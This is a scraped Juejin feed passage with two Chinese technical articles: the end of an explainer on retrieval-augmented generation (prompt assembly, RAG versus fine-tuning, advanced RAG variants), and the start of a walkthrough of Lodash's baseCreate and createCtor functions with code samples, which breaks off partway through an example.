<p>这是最后一步，将检索结果转化为自然语言回答：</p>
<p>1.<strong>Prompt 组装</strong>：将用户的原始问题（Query）与检索到的上下文（Context）填充到预设的 Prompt 模板中。</p>
<p><em>Prompt 示例</em>：</p>
<blockquote>
<p>"请基于以下参考信息回答用户的问题。如果参考信息不足以回答，请说不知道。 参考信息：[Chunk 1]... [Chunk 2]... 用户问题：..."</p>
</blockquote>
<p>1.<strong>LLM 推理</strong>：将增强后的 Prompt 输入给大模型。</p>
<p>2.<strong>生成回答</strong>：模型综合上下文信息，生成最终答案。</p>
<p>从概率角度看，RAG 改变了模型的生成概率分布。传统生成的概率是 P(y∣x)P(y∣x)，而 RAG 是基于检索内容 zz的生成：</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/01f6edf61cdb464b929e40cb5b10bc74~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgYWliaWdkYXRh:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768979075&amp;x-signature=L0fIMsNO3HEy24os4pyq6aX4c9Q%3D" alt="" loading="lazy"/></p>
<p>其中 z是检索到的外部知识，P(z∣x)P(z∣x) 代表检索的相关性，P(y∣x,z)P(y∣x,z) 代表基于检索内容生成的概率。</p>
<h2 data-id="heading-8">4. RAG vs. 微调（Fine-Tuning）：如何选择？</h2>
<p>在 AI 工程化落地中，经常会有“RAG 和 微调哪个好？”的争论。根据 <a href="https://link.juejin.cn?target=https%3A%2F%2Fvocus.cc%2Farticle%2F67726335fd897800014ba973" target="_blank" title="https://vocus.cc/article/67726335fd897800014ba973" ref="nofollow noopener noreferrer">RAG和Fine-Tuning有什麼不同？</a> 以及其它参考内容：</p>






























<table><thead><tr><th>维度</th><th>RAG (检索增强生成)</th><th>Fine-Tuning (微调)</th></tr></thead><tbody><tr><td><strong>核心能力</strong></td><td><strong>知识获取</strong>：擅长利用外部、实时的具体信息。</td><td><strong>能力内化</strong>：擅长学习特定的指令格式、语言风格或复杂推理模式。</td></tr><tr><td><strong>数据更新频率</strong></td><td><strong>高</strong>：更新数据库即可，立等可取，成本极低。</td><td><strong>低</strong>：需要重新训练，周期长，成本高。</td></tr><tr><td><strong>准确性/幻觉</strong></td><td><strong>低幻觉</strong>：答案有据可依，可追溯来源。</td><td><strong>仍有幻觉</strong>：模型可能记住错误知识或产生记忆混淆。</td></tr><tr><td><strong>适用场景</strong></td><td>实时新闻、企业知识库问答、客服助手、法律法规查询。</td><td>医疗诊断推理、特定格式代码生成、角色扮演（风格模仿）。</td></tr></tbody></table>
<p><strong>结论</strong>：</p>
<p>•如果你的应用需要<strong>动态响应</strong>、<strong>频繁更新外部知识</strong>（如每天的股市简报），RAG 是不二之选。</p>
<p>•如果你需要模型深度掌握<strong>固定领域内的推理范式</strong>或<strong>特定的语言风格</strong>（如模仿莎士比亚写作），微调更合适。</p>
<p>•<strong>RAG + 微调</strong>：在 2026 年的高级应用中，通常采用混合模式。例如，用微调让模型学会“如何阅读医疗报告”，再用 RAG 提供“患者的实时体检数据”。</p>
<h2 data-id="heading-9">5. RAG 技术的进阶与未来（2026 视野）</h2>
<p>随着技术的发展，基础的 RAG（Naive RAG）已经演化出更多高级形态：</p>
<p>•<strong>Modular RAG（模块化 RAG）</strong> ：将检索、重排（Re-ranking）、生成等环节解耦，允许开发者像搭积木一样替换更强的组件。<a href="https://link.juejin.cn?target=https%3A%2F%2Fx.com%2Fshao__meng%2Fstatus%2F1839258531398324708" target="_blank" title="https://x.com/shao__meng/status/1839258531398324708" ref="nofollow noopener noreferrer">深入理解高级RAG 技术</a>。</p>
<p>•<strong>GraphRAG（图谱增强 RAG）</strong> ：微软等机构提出的结合知识图谱（Knowledge Graph）的 RAG。它不仅检索向量相似的片段，还能通过图谱关系找到实体之间的深层逻辑关联，解决跨文档的复杂推理问题。</p>
<p>•<strong>Agentic RAG（代理式 RAG）</strong> ：RAG 不再是一个单向流程，而是一个智能体（Agent）。它可以自主判断检索到的内容是否足够，如果不够，它会修改搜索关键词重新检索，甚至使用工具去联网搜索，直到找到满意答案。</p>
<h2 data-id="heading-10">6. 总结</h2>
<p>RAG 技术并不是简单的“搜索+粘贴”，它是一场让大模型从“记忆者”转变为“思考者”的架构革命。</p>
<p>通过本文，我们明确了 RAG 的定义：<strong>利用检索外部文档提升生成结果质量，充分利用领域知识和私有数据、实时数据，减少生成不确定性</strong>。</p>
<p>后续将继续系列文章中，从理论走向实战，争取动手搭建开发环境，写出第一行 RAG 代码，实现一个简易的“个人知识库助手”。</p>
<p><strong>参考文献与延伸阅读：</strong></p>
<p>1.<a href="https://link.juejin.cn?target=https%3A%2F%2Fsolwen.ai%2Fposts%2Fwhat-is-rag" target="_blank" title="https://solwen.ai/posts/what-is-rag" ref="nofollow noopener noreferrer">什麼是RAG？初學者也看得懂的檢索增強生成（RAG）基礎指南！ - Solwen.ai</a></p>
<p>2.<a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.redhat.com%2Fzh-cn%2Ftopics%2Fai%2Fwhat-is-retrieval-augmented-generation" target="_blank" title="https://www.redhat.com/zh-cn/topics/ai/what-is-retrieval-augmented-generation" ref="nofollow noopener noreferrer">什么是检索增强生成？ - RedHat</a></p>
<p>3.<a href="https://link.juejin.cn?target=https%3A%2F%2Fblog.csdn.net%2FBaihai_IDP%2Farticle%2Fdetails%2F133853738" target="_blank" title="https://blog.csdn.net/Baihai_IDP/article/details/133853738" ref="nofollow noopener noreferrer">RAG技术详解：揭秘基于垂直领域专有数据的生成 - CSDN</a></p>
<p>4.<a href="https://link.juejin.cn?target=https%3A%2F%2Fvocus.cc%2Farticle%2F67726335fd897800014ba973" target="_blank" title="https://vocus.cc/article/67726335fd897800014ba973" ref="nofollow noopener noreferrer">RAG和Fine-Tuning有什麼不同？深入解析兩大方法的應用與差異 - Vocus</a></p>
<p>5.<a href="https://link.juejin.cn?target=https%3A%2F%2Faiapi.sheincorp.cn%2Fchat%2Fsource_text" target="_blank" title="https://aiapi.sheincorp.cn/chat/source_text" ref="nofollow noopener noreferrer">RAG 快速开发实战 - 极客时间</a></p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Lodash 源码解读与原理分析 - Lodash 对象创建的完整流程]]></title>    <link>https://juejin.cn/post/7594851429162123298</link>    <guid>https://juejin.cn/post/7594851429162123298</guid>    <pubDate>2026-01-14T08:47:36.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7594851429162123298" data-draft-id="7594742976711720994" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Lodash 源码解读与原理分析 - Lodash 对象创建的完整流程"/> <meta itemprop="keywords" content="前端"/> <meta itemprop="datePublished" content="2026-01-14T08:47:36.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="Anita_Sun"/> <meta itemprop="url" content="https://juejin.cn/user/1811635884786839"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Lodash 源码解读与原理分析 - Lodash 对象创建的完整流程
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1811635884786839/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    Anita_Sun
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-14T08:47:36.000Z" title="Wed Jan 14 2026 08:47:36 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-14
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读14分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">一、核心底层工具：<code>baseCreate</code></h2>
<p><code>baseCreate</code> 是 Lodash 实现跨环境原型继承的核心函数，是所有包装器、构造函数继承的底层依赖，兼具<strong>性能优化</strong>、<strong>内存安全</strong>和<strong>环境兼容</strong>三大特性。</p>
<h3 data-id="heading-1">1. 完整实现</h3>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">var</span> baseCreate = (<span class="hljs-keyword">function</span>(<span class="hljs-params"/>) {
  <span class="hljs-comment">// 闭包缓存临时构造函数，避免重复创建带来的性能开销</span>
  <span class="hljs-keyword">function</span> <span class="hljs-title function_">object</span>(<span class="hljs-params"/>) {}
  <span class="hljs-keyword">return</span> <span class="hljs-keyword">function</span>(<span class="hljs-params">proto</span>) {
    <span class="hljs-comment">// 1. 边界处理：非对象类型原型直接返回空对象，避免继承异常</span>
    <span class="hljs-keyword">if</span> (!<span class="hljs-title function_">isObject</span>(proto)) {
      <span class="hljs-keyword">return</span> {};
    }
    <span class="hljs-comment">// 2. 性能优先：优先使用 ES5 原生 Object.create（现代环境性能更优）</span>
    <span class="hljs-keyword">if</span> (objectCreate) {
      <span class="hljs-keyword">return</span> <span class="hljs-title function_">objectCreate</span>(proto);
    }
    <span class="hljs-comment">// 3. 兼容低版本：模拟 Object.create 实现原型继承</span>
    object.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span> = proto;
    <span class="hljs-keyword">var</span> result = <span class="hljs-keyword">new</span> object;
    <span class="hljs-comment">// 重置临时构造函数原型，防止原型污染和内存泄漏</span>
    object.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span> = <span class="hljs-literal">undefined</span>;
    <span class="hljs-keyword">return</span> result;
  };
}());
</code></pre>
<h3 data-id="heading-2">2. 特性对比与核心应用</h3>






























<table><thead><tr><th>特性</th><th>baseCreate</th><th>原生 Object.create</th></tr></thead><tbody><tr><td>环境支持</td><td>ES3+（兼容 IE6/7/8）</td><td>ES5+（仅 IE9+）</td></tr><tr><td>边界处理</td><td>非对象原型返回 <code>{}</code></td><td>非对象原型抛 <code>TypeError</code></td></tr><tr><td>性能（100 万次调用）</td><td>原生模式～12ms；模拟模式～25ms</td><td>~10ms（仅支持环境）</td></tr><tr><td>内存安全</td><td>自动重置临时构造函数原型</td><td>无额外内存处理逻辑</td></tr></tbody></table>
<p><strong>核心应用场景</strong> ：</p>
<ol>
<li><strong>原型继承</strong>：创建继承指定原型的对象，替代 <code>new 构造函数</code> 避免冗余属性；</li>
<li><strong>包装器原型创建</strong>：<code>LodashWrapper</code>/<code>LazyWrapper</code> 均通过它继承 <code>baseLodash.prototype</code>；</li>
<li><strong>构造函数模拟</strong>：<code>createCtor</code> 中模拟 <code>new</code> 关键字，保证实例原型链正确；</li>
<li><strong>对象克隆</strong>：<code>baseClone</code> 底层依赖它，保证克隆对象继承原对象原型（区别于 <code>Object.assign</code> 丢失原型）；</li>
<li><strong>函数包装</strong>：<code>_.partial</code> 等方法创建偏函数时，继承原函数原型。</li>
</ol>
<p><strong>基础验证示例</strong>：</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">var</span> parent = { <span class="hljs-attr">name</span>: <span class="hljs-string">'parent'</span>, <span class="hljs-attr">sayHi</span>: <span class="hljs-function">() =&gt;</span> <span class="hljs-string">'hello'</span> };
<span class="hljs-keyword">var</span> child = <span class="hljs-title function_">baseCreate</span>(parent);
child.<span class="hljs-property">name</span> = <span class="hljs-string">'child'</span>;
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(child.<span class="hljs-title function_">sayHi</span>()); <span class="hljs-comment">// hello</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-title class_">Object</span>.<span class="hljs-title function_">getPrototypeOf</span>(child) === parent); <span class="hljs-comment">// true</span>
</code></pre>
<h2 data-id="heading-3">二、构造函数体系</h2>
<p>Lodash 定义了一套构造函数体系，覆盖<strong>值包装</strong>、<strong>惰性求值</strong>、<strong>哈希存储</strong>、<strong>构造函数兼容</strong>四大核心场景，所有构造函数均基于 <code>baseCreate</code> 实现原型复用，避免重复逻辑。</p>
<h3 data-id="heading-4">1. 构造函数完整对照表</h3>









































<table><thead><tr><th>构造函数</th><th>核心作用</th><th>关键属性 / 方法</th><th>设计亮点与细节</th></tr></thead><tbody><tr><td><strong>baseLodash</strong></td><td>所有包装器的原型链根载体</td><td>挂载通用方法：<code>value()</code>/<code>chain()</code></td><td>空函数，仅作为原型载体；抽离通用方法，避免所有包装器重复定义</td></tr><tr><td><strong>LodashWrapper</strong></td><td>普通值包装器，处理通用链式调用</td><td><code>__wrapped__</code>（原始值）、<code>__actions__</code>（操作队列）、<code>__chain__</code>（链式标记）、<code>__index__</code>（遍历索引）、<code>__values__</code>（结果缓存）</td><td>操作队列化存储；支持链式 / 非链式模式切换；非链式模式下调用方法直接返回结果</td></tr><tr><td><strong>LazyWrapper</strong></td><td>惰性包装器，优化数组批量操作</td><td><code>__wrapped__</code>（原始数组）、<code>__actions__</code>（惰性操作队列）、<code>__dir__</code>（遍历方向）、<code>__filtered__</code>（过滤标记）、<code>__iteratees__</code>（迭代器队列）、<code>__takeCount__</code>（短路阈值）、<code>__views__</code>（数组视图）</td><td>仅对数组生效；操作延迟执行；单次遍历 + 短路优化；支持正向 / 反向遍历，无需反转数组</td></tr><tr><td><strong>Hash</strong></td><td>兼容 ES3 的哈希表（替代 ES6 Map）</td><td><code>__data__</code>（无原型存储）、<code>size</code>（实时计数）；原型方法：<code>get/set/delete/clear/has</code></td><td>用 <code>HASH_UNDEFINED</code> 占位 <code>undefined</code> 值；<code>__data__</code> 基于 <code>Object.create(null)</code>，避免键名冲突</td></tr><tr><td><strong>createCtor</strong></td><td>构造函数包装工具，兼容 <code>new</code>/ 普通调用</td><td>0-7 参数直接 <code>new</code> 调用；超 7 参数用 <code>baseCreate+apply</code> 模拟</td><td>性能优化常见参数场景；严格遵循 ES 构造函数返回规则；兼容 ES6 class</td></tr></tbody></table>
<h3 data-id="heading-5">2. 构造函数实现</h3>
<h4 data-id="heading-6">（1）<code>createCtor</code> 完整实现</h4>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">function</span> <span class="hljs-title function_">createCtor</span>(<span class="hljs-params">Ctor</span>) {
  <span class="hljs-keyword">return</span> <span class="hljs-keyword">function</span>(<span class="hljs-params"/>) {
    <span class="hljs-keyword">var</span> args = <span class="hljs-variable language_">arguments</span>;
    <span class="hljs-comment">// 性能优化：0-7 个参数直接 new 调用（覆盖 90%+ 场景）</span>
    <span class="hljs-keyword">switch</span> (args.<span class="hljs-property">length</span>) {
      <span class="hljs-keyword">case</span> <span class="hljs-number">0</span>: <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Ctor</span>;
      <span class="hljs-keyword">case</span> <span class="hljs-number">1</span>: <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Ctor</span>(args[<span class="hljs-number">0</span>]);
      <span class="hljs-keyword">case</span> <span class="hljs-number">2</span>: <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Ctor</span>(args[<span class="hljs-number">0</span>], args[<span class="hljs-number">1</span>]);
      <span class="hljs-keyword">case</span> <span class="hljs-number">3</span>: <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Ctor</span>(args[<span class="hljs-number">0</span>], args[<span class="hljs-number">1</span>], args[<span class="hljs-number">2</span>]);
      <span class="hljs-keyword">case</span> <span class="hljs-number">4</span>: <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Ctor</span>(args[<span class="hljs-number">0</span>], args[<span class="hljs-number">1</span>], args[<span class="hljs-number">2</span>], args[<span class="hljs-number">3</span>]);
      <span class="hljs-keyword">case</span> <span class="hljs-number">5</span>: <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Ctor</span>(args[<span class="hljs-number">0</span>], args[<span class="hljs-number">1</span>], args[<span class="hljs-number">2</span>], args[<span class="hljs-number">3</span>], args[<span class="hljs-number">4</span>]);
      <span class="hljs-keyword">case</span> <span class="hljs-number">6</span>: <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Ctor</span>(args[<span class="hljs-number">0</span>], args[<span class="hljs-number">1</span>], args[<span class="hljs-number">2</span>], args[<span class="hljs-number">3</span>], args[<span class="hljs-number">4</span>], args[<span class="hljs-number">5</span>]);
      <span class="hljs-keyword">case</span> <span class="hljs-number">7</span>: <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Ctor</span>(args[<span class="hljs-number">0</span>], args[<span class="hljs-number">1</span>], args[<span class="hljs-number">2</span>], args[<span class="hljs-number">3</span>], args[<span class="hljs-number">4</span>], args[<span class="hljs-number">5</span>], args[<span class="hljs-number">6</span>]);
    }
    <span class="hljs-comment">// 通用场景：模拟 new 关键字行为</span>
    <span class="hljs-keyword">var</span> thisBinding = <span class="hljs-title function_">baseCreate</span>(<span class="hljs-title class_">Ctor</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>);
    <span class="hljs-keyword">var</span> result = <span class="hljs-title class_">Ctor</span>.<span class="hljs-title function_">apply</span>(thisBinding, args);
    <span class="hljs-comment">// 严格遵循 ES 规范：构造函数返回对象则覆盖实例</span>
    <span class="hljs-keyword">return</span> <span class="hljs-title function_">isObject</span>(result) ? result : thisBinding;
  };
}

<span class="hljs-comment">// ES6 class 兼容验证</span>
<span class="hljs-keyword">class</span> <span class="hljs-title class_">User</span> {
  <span class="hljs-title function_">constructor</span>(<span class="hljs-params">name</span>) { <span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span> = name; }
  <span class="hljs-title function_">sayHi</span>(<span class="hljs-params"/>) { <span class="hljs-keyword">return</span> <span class="hljs-string">`Hi <span class="hljs-subst">${<span class="hljs-variable language_">this</span>.name}</span>`</span>; }
}
<span class="hljs-keyword">var</span> userCtor = <span class="hljs-title function_">createCtor</span>(<span class="hljs-title class_">User</span>);
<span class="hljs-keyword">var</span> user = <span class="hljs-title function_">userCtor</span>(<span class="hljs-string">'Tom'</span>);
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(user.<span class="hljs-title function_">sayHi</span>()); <span class="hljs-comment">// Hi Tom</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(user <span class="hljs-keyword">instanceof</span> <span class="hljs-title class_">User</span>); <span class="hljs-comment">// true</span>
</code></pre>
<h6 data-id="heading-7">解决 “忘记写 new” 导致的逻辑错误</h6>
<p>JavaScript 中，构造函数的正确调用依赖 <code>new</code> 关键字，但新手（甚至资深开发者）很容易遗漏，导致 <code>this</code> 指向错误（浏览器中指向 <code>window</code>，Node.js 中指向 <code>global</code>），进而引发难以排查的 bug。</p>
<p><strong>没有 createCtor 的问题场景</strong>：</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">function</span> <span class="hljs-title function_">User</span>(<span class="hljs-params">name</span>) {
  <span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span> = name; <span class="hljs-comment">// 忘记 new 时，this 指向全局</span>
}
<span class="hljs-title class_">User</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-property">sayHi</span> = <span class="hljs-function">() =&gt;</span> <span class="hljs-string">`Hi <span class="hljs-subst">${<span class="hljs-variable language_">this</span>.name}</span>`</span>;

<span class="hljs-comment">// 错误调用：没写 new</span>
<span class="hljs-keyword">var</span> u1 = <span class="hljs-title class_">User</span>(<span class="hljs-string">'Tom'</span>); 
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(u1); <span class="hljs-comment">// undefined（构造函数无返回值）</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-variable language_">window</span>.<span class="hljs-property">name</span>); <span class="hljs-comment">// Tom（全局被污染）</span>

<span class="hljs-comment">// 正确调用：写 new</span>
<span class="hljs-keyword">var</span> u2 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">User</span>(<span class="hljs-string">'Jerry'</span>);
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(u2.<span class="hljs-property">name</span>); <span class="hljs-comment">// Jerry</span>
</code></pre>
<p><strong>有 createCtor 的解决效果：</strong></p>
<p>通过 <code>createCtor</code> 包装后，无论是否写 <code>new</code>，都能正确创建实例，避免全局污染和逻辑错误：</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">var</span> userCtor = <span class="hljs-title function_">createCtor</span>(<span class="hljs-title class_">User</span>);

<span class="hljs-comment">// 无 new 调用（新手易错场景）</span>
<span class="hljs-keyword">var</span> u1 = <span class="hljs-title function_">userCtor</span>(<span class="hljs-string">'Tom'</span>);
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(u1.<span class="hljs-property">name</span>); <span class="hljs-comment">// Tom（this 指向正确）</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(u1 <span class="hljs-keyword">instanceof</span> <span class="hljs-title class_">User</span>); <span class="hljs-comment">// true（仍是 User 实例）</span>

<span class="hljs-comment">// 有 new 调用（正常场景）</span>
<span class="hljs-keyword">var</span> u2 = <span class="hljs-keyword">new</span> <span class="hljs-title function_">userCtor</span>(<span class="hljs-string">'Jerry'</span>);
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(u2.<span class="hljs-property">name</span>); <span class="hljs-comment">// Jerry</span>
</code></pre>
<h6 data-id="heading-8">优化构造函数调用的性能</h6>
<p>JavaScript 中，<code>new Ctor.apply(this, args)</code> 这种 “通用调用方式” 性能较差（需要解构参数数组），而 <code>createCtor</code> 针对<strong>0-7 个参数</strong>（覆盖 90%+ 的实际开发场景）做了专门优化：</p>
<ul>
<li>0-7 个参数直接用 <code>new Ctor(参数1, 参数2...)</code> 调用，避免参数数组解构的开销；</li>
<li>仅当参数超过 7 个时，才使用 <code>baseCreate + apply</code> 的通用方式。</li>
</ul>




















<table><thead><tr><th>调用方式</th><th>执行时间</th><th>性能提升</th></tr></thead><tbody><tr><td>new Ctor(args[0], args[1])</td><td>~10ms</td><td>基准</td></tr><tr><td>Ctor.apply(thisBinding, args)</td><td>~13ms</td><td>慢 30%+</td></tr></tbody></table>
<p><code>createCtor</code> 优先使用高性能的直接调用方式，仅在极端场景（参数 &gt; 7）降级到通用方式，兼顾了 “常见场景性能” 和 “全场景兼容”。</p>
<h6 data-id="heading-9">严格遵循 ES 规范的构造函数返回规则</h6>
<p>JavaScript 构造函数有一个易被忽略的规则：<strong>如果构造函数返回一个对象（包括数组、函数、普通对象），则 <code>new</code> 表达式会返回这个对象，而非创建的实例</strong>；如果返回非对象（如基本类型、undefined），则返回实例。</p>
<p><code>createCtor</code> 完美模拟了这一规则，确保包装后的构造函数行为和原生完全一致：</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-comment">// 构造函数返回对象（覆盖实例）</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">Car</span>(<span class="hljs-params">brand</span>) {
  <span class="hljs-variable language_">this</span>.<span class="hljs-property">brand</span> = brand;
  <span class="hljs-keyword">return</span> { <span class="hljs-attr">model</span>: <span class="hljs-string">'Model 3'</span> }; <span class="hljs-comment">// 返回对象</span>
}

<span class="hljs-keyword">var</span> carCtor = <span class="hljs-title function_">createCtor</span>(<span class="hljs-title class_">Car</span>);
<span class="hljs-keyword">var</span> car = <span class="hljs-title function_">carCtor</span>(<span class="hljs-string">'Tesla'</span>);
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(car.<span class="hljs-property">brand</span>); <span class="hljs-comment">// undefined（实例被覆盖）</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(car.<span class="hljs-property">model</span>); <span class="hljs-comment">// Model 3（返回构造函数的对象）</span>

<span class="hljs-comment">// 构造函数返回非对象（返回实例）</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">Phone</span>(<span class="hljs-params">brand</span>) {
